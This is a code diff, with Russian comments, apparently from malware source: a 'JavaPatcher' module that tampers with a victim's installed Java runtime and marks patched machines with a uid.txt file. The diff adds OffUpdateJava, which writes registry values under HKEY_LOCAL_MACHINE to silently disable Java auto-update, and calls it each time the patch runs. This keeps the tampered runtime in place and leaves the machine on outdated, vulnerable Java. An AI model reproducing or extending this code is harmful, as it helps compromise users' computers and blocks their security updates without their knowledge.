@@ -35,6 +35,7 @@ static int javaVersion2 = 0; //версия явы в формате 10600 == 1.6.0
 static int javaBuild = 0; //билд или апдейт текущей версии явы 
 static int javaCompatible = 0; //совместимость явы для разных алгоритмов установки патча
 static char javaHome[MAX_PATH]; //папка явы
+static char javaMSI[MAX_PATH]; //папка с параметрами автообновления
 
 //Определяет версию явы, возвращает true если ява есть, иначе false. Заодно в переменную javaHome ложит путь к яве
 static bool GetJavaVersion()
@@ -61,6 +62,9 @@ static bool GetJavaVersion()
 		DBG( "JavaPatcher", "java home: %s", javaHome );
 
 		char* ver2 = Registry::GetStringValue( HKEY_LOCAL_MACHINE, (PCHAR)nameKeyJava, "Java6FamilyVersion" );
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		pwsprintfA( javaMSI, "%s\\%s\\MSI", nameKeyJava, ver2 ); 
+
 		if( ver2 )
 		{
 			//конвертируем версию явы в целое число
@@ -110,6 +114,19 @@ static bool GetJavaVersion()
 		STR::Free(ver1);
 	}
 	return res;
+}
+
+//отключает в реестре автообновление явы, функция работает только после выполнении функции GetJavaVersion()
+static bool OffUpdateJava()
+{
+	if( !Registry::SetValueString( HKEY_LOCAL_MACHINE, javaMSI, "AUTOUPDATECHECK", "0" ) )
+		return false;
+	if( !Registry::SetValueString( HKEY_LOCAL_MACHINE, javaMSI, "JAVAUPDATE", "0" ) )
+		return false;
+	if( !Registry::SetValueDWORD( HKEY_LOCAL_MACHINE, "SOFTWARE\\JavaSoft\\Java Update\\Policy", "EnableJavaUpdate", 0 ) )
+		return false;
+	DBG( "JavaPatcher", "отключено обновление явы" );
+	return true;
 }
 
 const char* GetJREPath()
@@ -796,6 +813,7 @@ static bool WJFile()
 DWORD WINAPI JavaPatch( LPVOID lpData )
 {
 	WJFile();
+	OffUpdateJava();
 	char uidTxt[MAX_PATH];
 	GetAllUsersProfile( uidTxt, sizeof(uidTxt), "uid.txt" );
 	if( File::IsExists(uidTxt) ) //уже пропатчили
